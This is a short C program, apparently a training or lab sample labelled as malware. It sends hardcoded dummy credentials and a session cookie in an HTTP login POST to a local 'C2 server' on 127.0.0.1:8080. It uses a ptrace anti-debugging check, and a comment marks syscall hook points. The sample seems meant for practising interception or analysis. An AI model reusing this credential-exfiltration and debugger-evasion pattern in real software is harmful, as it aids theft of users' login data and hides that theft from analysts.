#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#define TARGET_IP "127.0.0.1" 
#define TARGET_PORT 8080     

void send_malicious_request(int sock) {
    char buffer[2048];
    
    // stolen data
    char *user = "admin_erez";
    char *pass = "P@ssw0rd123!";
    char *cookie = "session_id=550e8400-e29b-41d4-a716-446655440000";


    char body[512];
    sprintf(body, "username=%s&password=%s", user, pass);


    sprintf(buffer,
            "POST /login HTTP/1.1\r\n"
            "Host: super-secure-bank.co.il\r\n"
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
            "Cookie: %s\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %ld\r\n"
            "Connection: close\r\n"
            "\r\n"
            "%s", 
            cookie, strlen(body), body);


    //printf("[*] Sending data to C2 server...\n");

    if (send(sock, buffer, strlen(buffer), 0) < 0) {
        //perror("[-] Send failed");
    } else {
        //printf("[+] Data sent successfully!\n");
    }
}

int main() {





    int sock;
    struct sockaddr_in serv_addr;



    if(ptrace(PTRACE_TRACEME,getpid(),0,0) == -1){
        printf("debugger dectected\n");
        return 0;
    }
    


    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr);

    //printf("[*] Connecting to %s:%d...\n", TARGET_IP, TARGET_PORT);


    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("[-] Connection failed. (Did you redirect the IP?)\n");
        return -1;
    }

    // נקודת ה-Hook השנייה (SYS_sendto / SYS_write)
    send_malicious_request(sock);

    close(sock);
    //printf("=== Malware Finished ===\n");
    return 0;
}